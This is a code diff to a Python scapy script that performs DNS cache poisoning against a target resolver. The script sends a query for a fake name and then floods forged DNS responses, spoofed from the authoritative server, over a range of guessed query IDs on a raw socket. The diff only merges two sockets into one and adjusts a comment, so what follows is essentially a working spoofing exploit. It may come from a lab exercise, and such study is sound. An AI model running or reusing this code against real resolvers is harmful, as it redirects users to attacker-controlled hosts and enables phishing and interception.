@@ -1,4 +1,3 @@
-from scapy.layers.dns import *
 from scapy.all import *
 from threading import Thread
 
@@ -84,7 +83,7 @@ def master_job():
                 print ('\n\n\nTry # ' + str(N_TRY) + '\n[FOUND]\tqID: ' + str(hex(Q_ID)) + '\t port: ' + str(PORT_NUMBER))
 
 
-                # TODO N.B: sul mio pc il DNS impiega 1 ms per un dig, in 1 ms l'host riesce a mandare circa 150 pacchetti
+                # TODO N.B: sul mio pc il DNS impiega 1 ms per un dig, in 1 ms l'host riesce a mandare circa 150 pacchetti, cambiarlo se necessario
                 for index in range(1, 200):                                                                             # building fake packets
                         pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
                               DNS(id=((Q_ID + index) % 65535), qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
@@ -99,10 +98,10 @@ def master_job():
                         PACKETS.append(bytes(pkt))
 
                 # fake request
-                query_sock.sendto((bytes(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname=FAKE_REQUEST)))), (VULN_DNS_IP, PORT_NUMBER))
+                raw_sock.sendto((bytes(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname=FAKE_REQUEST)))), (VULN_DNS_IP, PORT_NUMBER))
 
                 for pkt in PACKETS:
-                        flood_sock.sendto(pkt, (VULN_DNS_IP, PORT_NUMBER))                                              # sending fake packets
+                        raw_sock.sendto(pkt, (VULN_DNS_IP, PORT_NUMBER))                                                # sending fake packets
 
                 PORT_NUMBER = 0                                                                                         # reset for next cycle
                 Q_ID = 0
@@ -112,13 +111,10 @@ def master_job():
         listener_thread.join()
         print "Goal reached.\nEND"
 
-
 ############################ MAIN ###########################
 # init socket
-flood_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-query_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 
 master_job()
 
-flood_sock.close()
-query_sock.close()
+raw_sock.close()
